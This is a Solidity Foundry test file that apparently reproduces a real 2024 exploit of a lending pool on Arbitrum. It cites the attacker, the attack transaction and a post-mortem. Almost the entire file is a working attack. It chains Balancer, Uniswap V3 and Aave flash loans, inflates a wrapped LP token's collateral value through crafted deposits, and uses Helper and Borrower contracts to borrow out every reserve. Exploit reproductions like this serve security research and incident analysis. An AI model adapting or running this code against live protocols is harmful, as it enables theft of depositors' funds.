// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~340K
// Attacker : https://arbiscan.io/address/0x851aa754c39bf23cdaac2025367514dfd7530418
// Attack Contract 1: https://arbiscan.io/address/0x3e52c217a902002ca296fe6769c22fedaee9fda1
// Attack Contract 2: https://arbiscan.io/address/0x42fae47296b26385c4a5b62c46e4305a27c88988
// Vulnerable Contract : https://arbiscan.io/address/0x7746872c6892bcfb4254390283719f2bd2d4da76#code
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/arbitrum/0xcb1a2f5eeb1a767ea5ccbc3665351fadc1af135d12a38c504f8f6eb997e9e603

// @Analysis
// https://twitter.com/0xNickLFranklin/status/1774727539975672136
// https://twitter.com/Phalcon_xyz/status/1773546399713345965
// @Post Mortem
// https://hackmd.io/@LavaSecurity/03282024

interface ILendingPoolProxy {
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function deposit(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;
}

interface IUniV3Wrapper {
    function approve(address spender, uint256 value) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function getAssets()
        external
        view
        returns (uint256 amount0, uint256 amount1);

    function deposit(
        uint256 startingAmount0,
        uint256 startingAmount1,
        uint256 minAmount0Added,
        uint256 minAmount1Added
    ) external returns (uint128 liquidityMinted, uint256 sharesMinted);

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(
        uint256 shares
    )
        external
        returns (uint128 liquidityRemoved, uint256 amount0, uint256 amount1);
}

contract ContractTest is Test {
    IERC20 private constant USDC =
        IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 private constant USDCe =
        IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IUSDT private constant USDT =
        IUSDT(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 private constant WETH =
        IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 private constant wstETH =
        IERC20(0x5979D7b546E38E414F7E9822514be443A4800529);
    IERC20 private constant ausdcUsdcLP =
        IERC20(0x1e482f0606152890F84dD59617e13EC06581B45a);
    IBalancerVault private constant BalancerVault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniV3Wrapper private constant USDC_USDC_LP =
        IUniV3Wrapper(0x10bdA01aC4E644fD84a04Dab01E15A5eDcEE46dD);
    Uni_Pair_V3 private constant WETH_USDC =
        Uni_Pair_V3(0xC6962004f452bE9203591991D15f6b388e09E8D0);
    Uni_Pair_V3 private constant WETH_USDCe =
        Uni_Pair_V3(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    Uni_Pair_V3 private constant USDC_USDCe =
        Uni_Pair_V3(0x8e295789c9465487074a65b1ae9Ce0351172393f);
    IAaveFlashloan private constant AaveFlashloan =
        IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    ILendingPoolProxy private constant LendingPool =
        ILendingPoolProxy(0x403049E886b13E42C149f15450CEB795216cddC6);
    address private constant aUSDC = 0x16Cb622CaE7Ad9fd2b0780b2026ED301414781fE;
    address private constant aUSDCe =
        0x16cba9A6a9BB38e339D4250dA0Afd919c6bDBDfE;
    address private constant aUSDT = 0x8Da6Bc74B2534030cD38C996C395B914990fa684;
    address private constant aWETH = 0xec9b99C8262b72d846F0F80fCE76AF7D3c7c6AF6;
    address private constant awstETH =
        0xCB1332663a39f238BCD1cc7621E3E24A50251b94;
    // Following specific values comes from original attack contract storage
    // Values have been decoded with the use of 'cast storage'
    uint256 private constant multiplier = 1e12;
    uint256 private constant divisor = 3_567;
    uint256 private constant specifiedUSDCAmount = 3_940_702_470_228;
    uint256 private constant specifiedUSDCeAmount = 5_490_000_000_000;
    uint256 private constant amountOfWETHToTransfer =
        35_735_259_567_507_709_558;
    uint256 private constant valueForCalcDepositAmount = 6_401_169_117_048;
    uint160 private constant priceLimitForSwap1 =
        79_232_123_823_359_799_118_287_999_568;
    uint160 private constant priceLimitForSwap2 =
        79_188_560_314_459_151_373_725_315_960;
    Helper private helper;
    Borrower private borrower;

    function setUp() public {
        vm.createSelectFork("arbitrum", 195240642);
        vm.label(address(USDC), "USDC");
        vm.label(address(USDCe), "USDCe");
        vm.label(address(USDT), "USDT");
        vm.label(address(WETH), "WETH");
        vm.label(address(BalancerVault), "BalancerVault");
        vm.label(address(USDC_USDC_LP), "USDC_USDC_LP");
        vm.label(address(WETH_USDC), "WETH_USDC");
        vm.label(address(WETH_USDCe), "WETH_USDCe");
        vm.label(address(USDC_USDCe), "USDC_USDCe");
        vm.label(address(AaveFlashloan), "AaveFlashloan");
        vm.label(address(LendingPool), "LendingPool");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter USDCe balance before attack",
            USDCe.balanceOf(address(this)),
            USDCe.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter wstEth balance before attack",
            wstETH.balanceOf(address(this)),
            wstETH.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter USDT balance before attack",
            USDT.balanceOf(address(this)),
            6
        );

        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter USDC balance before attack",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        uint256 amountWETH = calcWETHAmount();
        address[] memory tokens = new address[](3);
        tokens[0] = address(WETH);
        tokens[1] = address(USDC);
        tokens[2] = address(USDCe);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = amountWETH;
        amounts[1] = USDC.balanceOf(address(BalancerVault));
        amounts[2] = USDCe.balanceOf(address(BalancerVault));

        BalancerVault.flashLoan(address(this), tokens, amounts, "");

        emit log_named_decimal_uint(
            "Exploiter USDCe balance after attack",
            USDCe.balanceOf(address(this)),
            USDCe.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter wstEth balance after attack",
            wstETH.balanceOf(address(this)),
            wstETH.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter USDT balance after attack",
            USDT.balanceOf(address(this)),
            6
        );

        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter USDC balance after attack",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        // amount1=1 because Pair USDC balance is greater than specific value from attack contract (storage 19)
        WETH_USDC.flash(address(this), 0, 1, abi.encode(uint256(1), uint8(1)));
        WETH.transfer(address(BalancerVault), amounts[0]);
        USDC.transfer(address(BalancerVault), amounts[1]);
        USDCe.transfer(address(BalancerVault), amounts[2]);
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        (uint256 borrowedAmount, uint8 flashId) = abi.decode(
            data,
            (uint256, uint8)
        );
        if (flashId == 1) {
            // Flashloan USDC
            uint256 amountUSDC;
            if (USDC.balanceOf(address(this)) < specifiedUSDCAmount) {
                amountUSDC =
                    specifiedUSDCAmount -
                    USDC.balanceOf(address(this));
            } else {
                amountUSDC = 1;
            }
            address[] memory assets = new address[](2);
            assets[0] = address(USDC);
            assets[1] = address(USDCe);
            uint256[] memory amounts = new uint256[](2);
            amounts[0] = amountUSDC;
            amounts[1] = 1;
            uint256[] memory interestRateModes = new uint256[](2);
            interestRateModes[0] = 0;
            interestRateModes[1] = 0;

            AaveFlashloan.flashLoan(
                address(this),
                assets,
                amounts,
                interestRateModes,
                address(this),
                "",
                0
            );
            USDC.transfer(address(WETH_USDC), 2);
        } else if (flashId == 2) {
            USDC.approve(address(USDC_USDC_LP), type(uint256).max);
            USDCe.approve(address(USDC_USDC_LP), type(uint256).max);
            USDC_USDC_LP.deposit(1e9, 1e9, 0, 0);
            helper = new Helper();
            WETH.transfer(address(helper), amountOfWETHToTransfer);
            helper.depositAndBorrow();

            int256 swapAmount = USDCeToUSDC();
            USDC_USDC_LP.withdraw(USDC_USDC_LP.balanceOf(address(this)));

            // First deposit to UniV3Wrapper
            // Following two values are from raw hex values (no calculations found)
            uint256 amount0 = 2_699_999_999_117;
            uint256 amount1 = 2_700_269_999_117;
            uint256 startingAmount0_1 = amount0 *
                ((1e18 * valueForCalcDepositAmount) / (amount0 + amount1));
            uint256 startingAmount1_1 = amount1 *
                ((1e18 * valueForCalcDepositAmount) / (amount0 + amount1));
            USDC_USDC_LP.deposit(
                startingAmount0_1 / 1e18,
                startingAmount1_1 / 1e18,
                0,
                0
            );
            // Second deposit to UniV3Wrapper
            uint256 startingAmount0_2 = 20 * (startingAmount0_1 / 1e18);
            uint256 startingAmount1_2 = 20 * (startingAmount1_1 / 1e18);
            (, uint256 sharesMinted) = USDC_USDC_LP.deposit(
                startingAmount0_2 / 1_000,
                startingAmount1_2 / 1_000,
                0,
                0
            );
            USDC_USDC_LP.approve(address(LendingPool), type(uint256).max);
            WETH.approve(address(LendingPool), type(uint256).max);

            // Third deposit to Lending Pool
            LendingPool.deposit(
                address(WETH),
                WETH.balanceOf(address(this)),
                address(this),
                0
            );
            // Fourth deposit to Lending Pool
            LendingPool.deposit(
                address(USDC_USDC_LP),
                USDC_USDC_LP.balanceOf(address(this)) - sharesMinted,
                address(this),
                0
            );

            borrower = new Borrower();
            ausdcUsdcLP.transfer(
                address(borrower),
                ausdcUsdcLP.balanceOf(address(this))
            );
            LendingPool.borrow(
                address(USDC_USDC_LP),
                USDC_USDC_LP.balanceOf(address(ausdcUsdcLP)),
                2,
                0,
                address(this)
            );
            USDC_USDC_LP.withdraw(USDC_USDC_LP.balanceOf(address(this)));
            USDC_USDCe.flash(
                address(this),
                1_000_000,
                0,
                abi.encode(uint256(1_000_000), uint8(3))
            );

            borrower.borrow();
            USDCToUSDCe(swapAmount);
            USDCe.transfer(address(WETH_USDCe), borrowedAmount + fee1);
        } else if (flashId == 3) {
            USDC.transfer(address(USDC_USDCe), 26_001_000_000);
        }
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Flashloan USDCe
        uint256 amountUSDCe = specifiedUSDCeAmount -
            USDCe.balanceOf(address(this));
        WETH_USDCe.flash(
            address(this),
            0,
            amountUSDCe,
            abi.encode(uint256(amountUSDCe), uint8(2))
        );
        USDC.approve(address(AaveFlashloan), amounts[0] + premiums[0]);
        USDCe.approve(address(AaveFlashloan), amounts[1] + premiums[1]);
        return true;
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        if (amount0Delta > 0) {
            USDC.transfer(address(USDC_USDCe), uint256(amount0Delta));
        } else {
            USDCe.transfer(address(USDC_USDCe), uint256(amount1Delta));
        }
    }

    function calcTokenAmount(
        uint256 aTokenBal,
        uint256 amount
    ) private pure returns (uint256 tokenAmount) {
        uint256 multipliedBalance = aTokenBal * multiplier;
        tokenAmount = (amount + (multipliedBalance / divisor));
    }

    function calcUSDCLPAmount() private view returns (uint256 amountUSDC) {
        (uint256 amount0, uint256 amount1) = USDC_USDC_LP.getAssets();
        uint256 scaledSumOfAmounts = ((amount0 + amount1) * multiplier) /
            divisor;
        amountUSDC = (12_625 * scaledSumOfAmounts) / 10_000;
    }

    function calcWETHAmount() private view returns (uint256 amount) {
        uint256 aUSDCAmount = calcTokenAmount(USDC.balanceOf(aUSDC), 0);
        uint256 aUSDCeAmount = calcTokenAmount(
            USDCe.balanceOf(aUSDCe),
            aUSDCAmount
        );
        uint256 aUSDTAmount = calcTokenAmount(
            USDT.balanceOf(aUSDT),
            aUSDCeAmount
        );
        uint256 aWETHAmount = WETH.balanceOf(aWETH) + aUSDTAmount;

        uint256 a = aWETHAmount + ((wstETH.balanceOf(awstETH) * 1_159) / 1_000);
        uint256 b = (a + calcUSDCLPAmount()) * 100;
        uint256 c = (b / 496) * 100;
        amount = (c * 104) / 100;
    }

    function USDCeToUSDC() private returns (int256 amount) {
        (amount, ) = USDC_USDCe.swap(
            address(this),
            false,
            int256(specifiedUSDCeAmount),
            uint160(priceLimitForSwap1),
            ""
        );
    }

    function USDCToUSDCe(int256 amount) private {
        USDC_USDCe.swap(
            address(this),
            true,
            amount,
            uint160(priceLimitForSwap2),
            ""
        );
    }
}

contract Helper {
    IERC20 private constant WETH =
        IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    ILendingPoolProxy private constant LendingPool =
        ILendingPoolProxy(0x403049E886b13E42C149f15450CEB795216cddC6);
    IUniV3Wrapper private constant USDC_USDC_LP =
        IUniV3Wrapper(0x10bdA01aC4E644fD84a04Dab01E15A5eDcEE46dD);
    address private constant ausdcUsdcLP =
        0x1e482f0606152890F84dD59617e13EC06581B45a;

    function depositAndBorrow() external {
        WETH.approve(address(LendingPool), type(uint256).max);
        LendingPool.deposit(
            address(WETH),
            WETH.balanceOf(address(this)),
            address(this),
            0
        );

        uint256 amount = (USDC_USDC_LP.balanceOf(ausdcUsdcLP) * 99) / 100;
        LendingPool.borrow(address(USDC_USDC_LP), amount, 2, 0, address(this));
        USDC_USDC_LP.transfer(msg.sender, amount);
    }
}

contract Borrower {
    IERC20 private constant USDCe =
        IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 private constant USDC =
        IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IUSDT private constant USDT =
        IUSDT(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 private constant WETH =
        IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 private constant wstETH =
        IERC20(0x5979D7b546E38E414F7E9822514be443A4800529);
    address private constant aUSDCe =
        0x16cba9A6a9BB38e339D4250dA0Afd919c6bDBDfE;
    ILendingPoolProxy private constant LendingPool =
        ILendingPoolProxy(0x403049E886b13E42C149f15450CEB795216cddC6);
    address private constant aUSDC = 0x16Cb622CaE7Ad9fd2b0780b2026ED301414781fE;
    address private constant aUSDT = 0x8Da6Bc74B2534030cD38C996C395B914990fa684;
    address private constant aWETH = 0xec9b99C8262b72d846F0F80fCE76AF7D3c7c6AF6;
    address private constant awstETH =
        0xCB1332663a39f238BCD1cc7621E3E24A50251b94;

    function borrow() external {
        address[] memory tokens = new address[](5);
        tokens[0] = address(USDCe);
        tokens[1] = address(USDC);
        tokens[2] = address(USDT);
        tokens[3] = address(WETH);
        tokens[4] = address(wstETH);

        address[] memory aTokens = new address[](5);
        aTokens[0] = address(aUSDCe);
        aTokens[1] = address(aUSDC);
        aTokens[2] = address(aUSDT);
        aTokens[3] = address(aWETH);
        aTokens[4] = address(awstETH);

        for (uint256 i; i < tokens.length; ++i) {
            if (tokens[i] == address(USDT)) {
                LendingPool.borrow(
                    tokens[i],
                    IUSDT(tokens[i]).balanceOf(aTokens[i]),
                    2,
                    0,
                    address(this)
                );
                IUSDT(tokens[i]).transfer(
                    msg.sender,
                    IUSDT(tokens[i]).balanceOf(address(this))
                );
            } else {
                uint256 amount = IERC20(tokens[i]).balanceOf(aTokens[i]);
                LendingPool.borrow(tokens[i], amount, 2, 0, address(this));
                IERC20(tokens[i]).transfer(
                    msg.sender,
                    IERC20(tokens[i]).balanceOf(address(this))
                );
            }
        }
    }
}
